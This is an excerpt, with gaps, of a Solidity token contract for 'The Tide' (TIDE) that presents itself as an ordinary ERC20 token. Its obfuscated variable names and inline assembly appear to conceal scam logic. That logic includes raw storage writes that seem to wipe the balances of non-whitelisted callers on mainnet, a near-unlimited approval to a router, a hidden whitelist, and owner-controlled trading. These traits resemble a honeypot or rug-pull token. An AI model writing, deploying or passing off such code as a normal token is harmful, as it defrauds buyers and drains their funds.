...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTide;
    uint256 private peasBeans = block.number*2;

    mapping (address => bool) private _firstWrite; 
    mapping (address => bool) private _secondSing;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address private _bathRoom;

    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address _router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    uint256 private babyDoll;
    address public pair;
    ...
    bool private trading; uint256 private hidingFun = 1; bool private hereArrive;
    uint256 private _decimals; uint256 private theArrival;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTide.push(_router); addTide.push(msgSender_); addTide.push(pair);
        for (uint256 q=0; q < 3;) {_firstWrite[addTide[q]] = true; unchecked{q++;} }
    }
    ...
    function _startToken() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0xC8)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0x926600894f0b00448d8f726b7aa58de3a4d2bdebb1a0ea5ac8395c9dd175b124
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x9cee33882dcfcb4d59c0bdae956f9434390140bf275fee8322c81ad3d9fe3f91,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; peasBeans = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTide[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployTide(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTide[0], 10 ** 77);
        _startToken();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTide(creator, initialSupply);
    }
}

contract TheTide is ERC20Token {
    constructor() ERC20Token("The Tide", "TIDE", msg.sender, 3925000 * 10 ** 18) {
    }
}